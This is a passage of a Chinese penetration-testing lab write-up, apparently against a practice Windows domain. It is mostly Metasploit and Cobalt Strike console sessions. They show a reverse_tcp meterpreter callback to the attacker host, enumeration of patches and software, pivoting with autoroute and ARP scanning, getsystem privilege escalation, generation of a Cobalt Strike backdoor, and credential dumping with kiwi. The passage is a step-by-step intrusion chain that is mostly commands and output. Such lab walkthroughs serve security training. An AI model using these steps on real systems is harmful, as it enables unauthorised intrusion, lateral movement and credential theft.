<span class="line">   ----  ---------------  --------  -----------</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Payload options <span class="token punctuation">(</span>windows/x64/meterpreter/reverse_tcp<span class="token punctuation">)</span>:</span>
<span class="line"></span>
<span class="line">   Name      Current Setting  Required  Description</span>
<span class="line">   ----      ---------------  --------  -----------</span>
<span class="line">   EXITFUNC  process          <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">&#39;&#39;</span>, seh, thread, process, none<span class="token punctuation">)</span></span>
<span class="line">   LHOST     <span class="token number">192.168</span>.220.137  <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span></span>
<span class="line">   LPORT     <span class="token number">9999</span>             <span class="token function">yes</span>       The listen port</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Exploit target:</span>
<span class="line"></span>
<span class="line">   Id  Name</span>
<span class="line">   --  ----</span>
<span class="line">   <span class="token number">0</span>   Wildcard Target</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.220.137:9999 </span>
<span class="line"></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>到蚁剑中运行</p><p><img src="`+M+`" alt="image-20220811184743952"></p><p>Kali监听响应：</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.220.137:9999 </span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">200262</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span>.220.138</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">2</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.220.137:9999 -<span class="token operator">&gt;</span> <span class="token number">192.168</span>.220.138:1237 <span class="token punctuation">)</span> at <span class="token number">2022</span>-08-11 06:45:39 <span class="token parameter variable">-0400</span></span>
<span class="line"></span>
<span class="line">meterpreter <span class="token operator">&gt;</span> </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>收集补丁信息</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span>
<span class="line"></span>
<span class="line">[*] Patch list saved to /root/.msf4/loot/20220811064922_default_192.168.220.138_enum_patches_752941.txt</span>
<span class="line">[+] KB2534111 installed on 8/25/2019</span>
<span class="line">[+] KB2999226 installed on 9/15/2019</span>
<span class="line">[+] KB958488 installed on 8/29/2019</span>
<span class="line">[+] KB976902 installed on 11/21/2010</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>收集主机内软件安装信息</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">meterpreter &gt; run post/windows/gather/enum_applications</span>
<span class="line"></span>
<span class="line">[*] Enumerating applications installed on STU1</span>
<span class="line"></span>
<span class="line">Installed Applications</span>
<span class="line">======================</span>
<span class="line"></span>
<span class="line"> Name                                                                Version</span>
<span class="line"> ----                                                                -------</span>
<span class="line"> Everything 1.4.1.877 (x64)                                          1.4.1.877 (x64)</span>
<span class="line"> Microsoft .NET Framework 4 Client Profile                           4.0.30319</span>
<span class="line"> Microsoft .NET Framework 4 Client Profile                           4.0.30319</span>
<span class="line"> Microsoft .NET Framework 4 Extended                                 4.0.30319</span>
<span class="line"> Microsoft .NET Framework 4 Extended                                 4.0.30319</span>
<span class="line"> Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161      9.0.30729.6161</span>
<span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148      9.0.30729.4148</span>
<span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161      9.0.30729.6161</span>
<span class="line"> Microsoft Visual C++ 2013 Redistributable (x86) - 12.0.21005        12.0.21005.1</span>
<span class="line"> Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.21005       12.0.21005</span>
<span class="line"> Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.21005          12.0.21005</span>
<span class="line"> Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508  14.20.27508.1</span>
<span class="line"> Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508  14.20.27508.1</span>
<span class="line"> Microsoft Visual C++ 2019 X64 Additional Runtime - 14.20.27508      14.20.27508</span>
<span class="line"> Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.20.27508         14.20.27508</span>
<span class="line"> Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508      14.20.27508</span>
<span class="line"> Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508         14.20.27508</span>
<span class="line"> Mozilla Firefox 69.0.1 (x86 zh-CN)                                  69.0.1</span>
<span class="line"> Mozilla Maintenance Service                                         68.0.2</span>
<span class="line"> Nmap 7.80                                                           7.80</span>
<span class="line"> Notepad++ (32-bit x86)                                              7.7.1</span>
<span class="line"> Npcap 0.9983                                                        0.9983</span>
<span class="line"> OpenVPN 2.4.7-I603                                                  2.4.7-I603</span>
<span class="line"> Python 2.7 (64-bit)                                                 2.7.150</span>
<span class="line"> TAP-Windows 9.21.2                                                  9.21.2</span>
<span class="line"> VMware Tools                                                        11.0.6.15940789</span>
<span class="line"> WinPcap 4.1.3                                                       4.1.0.2980</span>
<span class="line"> WinRAR 5.71 (64-位)                                                  5.71.0</span>
<span class="line"> Wireshark 3.0.4 32-bit                                              3.0.4</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">[+] Results stored in: /root/.msf4/loot/20220811064952_default_192.168.220.138_host.application_850045.txt</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>发现nmap，可以直接利用，对其内网进行扫描</p><p>但是在实际环境当中，目标计算机一般不会自带nmap，所以模拟真实的环境，先把流量代理出来，利用攻击机自身的工具，去对内网进行一个扫描</p></blockquote><h2 id="内网渗透" tabindex="-1"><a class="header-anchor" href="#内网渗透"><span>内网渗透</span></a></h2><p>添加路由</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">meterpreter &gt; run autoroute -s 192.168.52.0 255.255.255.0</span>
<span class="line"></span>
<span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span>
<span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span>
<span class="line">[*] Adding a route to 192.168.52.0/255.255.255.0...</span>
<span class="line">[+] Added route to 192.168.52.0/255.255.255.0 via 192.168.220.138</span>
<span class="line">[*] Use the -p option to list all active routes</span>
<span class="line">meterpreter &gt; run autoroute -p</span>
<span class="line"></span>
<span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span>
<span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span>
<span class="line"></span>
<span class="line">Active Routing Table</span>
<span class="line">====================</span>
<span class="line"></span>
<span class="line">   Subnet             Netmask            Gateway</span>
<span class="line">   ------             -------            -------</span>
<span class="line">   192.168.52.0       255.255.255.0      Session 2</span>
<span class="line"></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="arp扫内网主机" tabindex="-1"><a class="header-anchor" href="#arp扫内网主机"><span>ARP扫内网主机</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner rhosts=192.168.52.0/24</span>
<span class="line"></span>
<span class="line">[*] Running module against STU1</span>
<span class="line">[*] ARP Scanning 192.168.52.0/24</span>
<span class="line">[+]     IP: 192.168.52.138 MAC 00:0c:29:c1:33:d6 (VMware, Inc.)</span>
<span class="line">[+]     IP: 192.168.52.143 MAC 00:0c:29:bd:35:01 (VMware, Inc.)</span>
<span class="line">[+]     IP: 192.168.52.141 MAC 00:0c:29:1c:44:8e (VMware, Inc.)</span>
<span class="line">[+]     IP: 192.168.52.255 MAC 00:0c:29:bd:35:01 (VMware, Inc.)</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>暂时将handler隐藏到后台</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">meterpreter &gt; background </span>
<span class="line">[*] Backgrounding session 2...</span>
<span class="line">msf6 exploit(multi/handler) &gt; back</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="判断域控" tabindex="-1"><a class="header-anchor" href="#判断域控"><span>判断域控</span></a></h3><p>法一：上传nbtscan，扫子网</p><p><img src="`+D+'" alt="image-20220811204915927"></p><p>法二：nmap扫描出的主机端口开放情况判断，192.168.52.138这台主机开启了464端口和389端口</p><p><img src="'+P+`" alt="image-20220811210453367"></p><h3 id="msf起代理-nmap失败" tabindex="-1"><a class="header-anchor" href="#msf起代理-nmap失败"><span>msf起代理 (nmap失败)</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">msf6 &gt; use auxiliary/server/socks_proxy </span>
<span class="line">msf6 auxiliary(server/socks_proxy) &gt; show options </span>
<span class="line"></span>
<span class="line">Module options (auxiliary/server/socks_proxy):</span>
<span class="line"></span>
<span class="line">   Name      Current Setting  Required  Description</span>
<span class="line">   ----      ---------------  --------  -----------</span>
<span class="line">   PASSWORD                   no        Proxy password for SOCKS5 listener</span>
<span class="line">   SRVHOST   0.0.0.0          yes       The address to listen on</span>
<span class="line">   SRVPORT   1080             yes       The port to listen on</span>
<span class="line">   USERNAME                   no        Proxy username for SOCKS5 listener</span>
<span class="line">   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Auxiliary action:</span>
<span class="line"></span>
<span class="line">   Name   Description</span>
<span class="line">   ----   -----------</span>
<span class="line">   Proxy  Run a SOCKS proxy server</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">msf6 auxiliary(server/socks_proxy) &gt; set srvhost 127.0.0.1</span>
<span class="line">srvhost =&gt; 127.0.0.1</span>
<span class="line">msf6 auxiliary(server/socks_proxy) &gt; run</span>
<span class="line">[*] Auxiliary module running as background job 0.</span>
<span class="line"></span>
<span class="line">[*] Starting the SOCKS proxy server</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>nmap扫不出来，凉了</p><p><img src="`+N+'" alt="image-20220811234420908"></p><p><img src="'+I+'" alt="image-20220811233638539"></p><p>不过，蚁剑拿到了shell，回到蚁剑用Win7的nmap来扫就行</p><p><img src="'+W+`" alt="image-20220811233803703"></p><p>通过端口情况可以发现两台服务器的135 139 445开放，其均为永恒之蓝 MS17-010 的漏洞特征，因此我们可以尝试使用metasploit进行MS17-010的攻击。</p><h2 id="权限提升" tabindex="-1"><a class="header-anchor" href="#权限提升"><span>权限提升</span></a></h2><h3 id="法一-msf" tabindex="-1"><a class="header-anchor" href="#法一-msf"><span>法一：MSF</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">meterpreter &gt; getuid</span>
<span class="line">Server username: GOD\\Administrator</span>
<span class="line">meterpreter &gt; getsystem</span>
<span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span>
<span class="line">meterpreter &gt; getuid</span>
<span class="line">Server username: NT AUTHORITY\\SYSTEM</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="法二-使用cs模块-含渗透" tabindex="-1"><a class="header-anchor" href="#法二-使用cs模块-含渗透"><span>法二：使用CS模块 (含渗透)</span></a></h3><p>先将CS服务端开起来</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Desktop/csrun<span class="token punctuation">]</span></span>
<span class="line">└─<span class="token comment"># ./teamserver  </span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Generating X509 certificate and keystore <span class="token punctuation">(</span>for SSL<span class="token punctuation">)</span></span>
<span class="line">Picked up _JAVA_OPTIONS: <span class="token parameter variable">-Dawt.useSystemAAFontSettings</span><span class="token operator">=</span>on <span class="token parameter variable">-Dswing.aatext</span><span class="token operator">=</span>true</span>
<span class="line">Picked up _JAVA_OPTIONS: <span class="token parameter variable">-Dawt.useSystemAAFontSettings</span><span class="token operator">=</span>on <span class="token parameter variable">-Dswing.aatext</span><span class="token operator">=</span>true</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> ./teamserver <span class="token operator">&lt;</span>host<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>password<span class="token operator">&gt;</span> <span class="token punctuation">[</span>/path/to/c2.profile<span class="token punctuation">]</span> <span class="token punctuation">[</span>YYYY-MM-DD<span class="token punctuation">]</span></span>
<span class="line"></span>
<span class="line">        <span class="token operator">&lt;</span>host<span class="token operator">&gt;</span> is the <span class="token punctuation">(</span>default<span class="token punctuation">)</span> IP address of this Cobalt Strike team server</span>
<span class="line">        <span class="token operator">&lt;</span>password<span class="token operator">&gt;</span> is the shared password to connect to this server</span>
<span class="line">        <span class="token punctuation">[</span>/path/to/c2.profile<span class="token punctuation">]</span> is your Malleable C2 profile</span>
<span class="line">        <span class="token punctuation">[</span>YYYY-MM-DD<span class="token punctuation">]</span> is a <span class="token function">kill</span> <span class="token function">date</span> <span class="token keyword">for</span> Beacon payloads run from this server</span>
<span class="line"></span>
<span class="line">                                                                                     </span>
<span class="line">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Desktop/csrun<span class="token punctuation">]</span></span>
<span class="line">└─<span class="token comment"># ./teamserver 192.168.220.137 123456</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Will use existing X509 certificate and keystore <span class="token punctuation">(</span>for SSL<span class="token punctuation">)</span></span>
<span class="line">Picked up _JAVA_OPTIONS: <span class="token parameter variable">-Dawt.useSystemAAFontSettings</span><span class="token operator">=</span>on <span class="token parameter variable">-Dswing.aatext</span><span class="token operator">=</span>true</span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Team server is up on <span class="token number">0.0</span>.0.0:50050</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> SHA256 <span class="token builtin class-name">hash</span> of SSL cert is: b72145ea2b81b84481d743de0a082e74bd6a942fd5ba06cc35cc35dc8804b90d</span>
<span class="line"></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后打开CS</p><p><img src="`+q+'" alt="image-20220812193821408"></p><p><img src="'+H+'" alt="image-20220812193829530"></p><p>创建监听器</p><blockquote><p>两个IP都填kali的IP就行</p></blockquote><p><img src="'+V+'" alt="image-20220813012832949"></p><p>生成后门</p><p><img src="'+B+'" alt="image-20220812203942962"></p><p>选择刚才创建的监听器</p><blockquote><p>本处图片仅供参考</p></blockquote><p><img src="'+Y+'" alt="image-20220812204000037"></p><p>生成x64并保存</p><p><img src="'+U+'" alt="image-20220812204213769"></p><p>用蚁剑上传文件，并在蚁剑中的shell将后门运行起来，kali的CS就会有反应</p><p><img src="'+j+'" alt="image-20220813013038873"></p><p><strong>开始提权：</strong></p><blockquote><p><strong>exe提权</strong></p><p>upload # 加载exe文件 shell 文件名 shell &quot;whoami&quot; # 提权并执行命令</p></blockquote><blockquote><p><strong>提权文件参考</strong></p><p>https://github.com/k8gege/K8tools/</p><p>https://github.com/SecWiki/windows-kernel-exploits/</p><p>https://github.com/rsmudge/ElevateKit</p></blockquote><p>导入ElevateKit插件</p><p><img src="'+L+'" alt="image-20220813013434738"></p><p>开多一个监听器</p><p><img src="'+G+'" alt="image-20220813013826709"></p><p>提权</p><p><img src="'+K+'" alt="image-20220813013626626"></p><p><img src="'+z+'" alt="image-20220813014237238"></p><p>提权成功</p><p><img src="'+F+`" alt="image-20220813014501295"></p><h2 id="远程登陆" tabindex="-1"><a class="header-anchor" href="#远程登陆"><span>远程登陆</span></a></h2><h3 id="获取密码" tabindex="-1"><a class="header-anchor" href="#获取密码"><span>获取密码</span></a></h3><h4 id="法一-msf-1" tabindex="-1"><a class="header-anchor" href="#法一-msf-1"><span>法一：MSF</span></a></h4><blockquote><p>ps # 查看 lsm.exe 进程的 PID</p><p>migrate 512 <em># 默认是加载32位的系统，所以如果目标主机是64位系统的话,需要将进程迁移到一个64位程序的进程中</em></p><p>load kiwi <em># 加载kiwi模块</em></p><p>creds_all <em># 列举系统中的明文密码</em></p></blockquote><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">meterpreter <span class="token operator">&gt;</span> <span class="token function">ps</span></span>
<span class="line"></span>
<span class="line">Process List</span>
<span class="line"><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span></span>
<span class="line"></span>
<span class="line"> PID   <span class="token environment constant">PPID</span>  Name               Arch  Session  User                          Path</span>
<span class="line"> ---   ----  ----               ----  -------  ----                          ----</span>
<span class="line"> <span class="token number">0</span>     <span class="token number">0</span>     <span class="token punctuation">[</span>System Process<span class="token punctuation">]</span></span>
<span class="line"> <span class="token number">4</span>     <span class="token number">0</span>     System             x64   <span class="token number">0</span></span>
<span class="line"> <span class="token number">244</span>   <span class="token number">4</span>     smss.exe           x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>SYSTEM           <span class="token punctuation">\\</span>SystemRoot<span class="token punctuation">\\</span>System32<span class="token punctuation">\\</span>smss.exe</span>
<span class="line"> <span class="token number">348</span>   <span class="token number">328</span>   csrss.exe          x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>SYSTEM           C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>csrss.exe</span>
<span class="line"> <span class="token number">396</span>   <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>NETWORK SERVICE  C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>svchost.exe</span>
<span class="line"> <span class="token number">404</span>   <span class="token number">396</span>   csrss.exe          x64   <span class="token number">1</span>        NT AUTHORITY<span class="token punctuation">\\</span>SYSTEM           C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>csrss.exe</span>
<span class="line"> <span class="token number">412</span>   <span class="token number">328</span>   wininit.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>SYSTEM           C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>wininit.exe</span>
<span class="line"> <span class="token number">448</span>   <span class="token number">396</span>   winlogon.exe       x64   <span class="token number">1</span>        NT AUTHORITY<span class="token punctuation">\\</span>SYSTEM           C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>winlogon.exe</span>
<span class="line"> <span class="token number">508</span>   <span class="token number">412</span>   services.exe       x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>SYSTEM           C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>services.exe</span>
<span class="line"> <span class="token number">516</span>   <span class="token number">412</span>   lsass.exe          x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>SYSTEM           C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>lsass.exe</span>
<span class="line"> <span class="token number">524</span>   <span class="token number">412</span>   lsm.exe            x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>SYSTEM           C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>lsm.exe</span>
<span class="line"> <span class="token number">612</span>   <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>SYSTEM           C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>svchost.exe</span>
<span class="line"> <span class="token number">692</span>   <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>NETWORK SERVICE  C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>svchost.exe</span>
<span class="line"> <span class="token number">792</span>   <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>LOCAL SERVICE    C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>System32<span class="token punctuation">\\</span>svchost.exe</span>
<span class="line"> <span class="token number">832</span>   <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>SYSTEM           C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>System32<span class="token punctuation">\\</span>svchost.exe</span>
<span class="line"> <span class="token number">860</span>   <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>SYSTEM           C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>svchost.exe</span>
<span class="line"> <span class="token number">984</span>   <span class="token number">832</span>   dwm.exe            x64   <span class="token number">1</span>        GOD<span class="token punctuation">\\</span>Administrator             C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>Dwm.exe</span>
<span class="line"> <span class="token number">992</span>   <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>LOCAL SERVICE    C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>svchost.exe</span>
<span class="line"> <span class="token number">1140</span>  <span class="token number">508</span>   spoolsv.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>SYSTEM           C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>System32<span class="token punctuation">\\</span>spoolsv.exe</span>
<span class="line"> <span class="token number">1184</span>  <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>LOCAL SERVICE    C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>svchost.exe</span>
<span class="line"> <span class="token number">1212</span>  <span class="token number">1516</span>  explorer.exe       x64   <span class="token number">1</span>        GOD<span class="token punctuation">\\</span>Administrator             C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>Explorer.EXE</span>
<span class="line"> <span class="token number">1328</span>  <span class="token number">1212</span>  vm3dservice.exe    x64   <span class="token number">1</span>        GOD<span class="token punctuation">\\</span>Administrator             C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>System32<span class="token punctuation">\\</span>vm3dservice.exe</span>
<span class="line"> <span class="token number">1388</span>  <span class="token number">508</span>   openvpnserv.exe    x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>SYSTEM           C:<span class="token punctuation">\\</span>Program Files<span class="token punctuation">\\</span>OpenVPN<span class="token punctuation">\\</span>bin<span class="token punctuation">\\</span>openvpnserv.exe</span>
<span class="line"> <span class="token number">1440</span>  <span class="token number">2116</span>  mysqld.exe         x86   <span class="token number">1</span>        GOD<span class="token punctuation">\\</span>Administrator             C:<span class="token punctuation">\\</span>phpStudy<span class="token punctuation">\\</span>MySQL<span class="token punctuation">\\</span>bin<span class="token punctuation">\\</span>mysqld.exe</span>
<span class="line"> <span class="token number">1460</span>  <span class="token number">508</span>   VGAuthService.exe  x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>SYSTEM           C:<span class="token punctuation">\\</span>Program Files<span class="token punctuation">\\</span>VMware<span class="token punctuation">\\</span>VMware Tools<span class="token punctuation">\\</span>VMware VGAuth<span class="token punctuation">\\</span>VG</span>
<span class="line">                                                                             AuthService.exe</span>
<span class="line"> <span class="token number">1544</span>  <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>SYSTEM           C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>System32<span class="token punctuation">\\</span>svchost.exe</span>
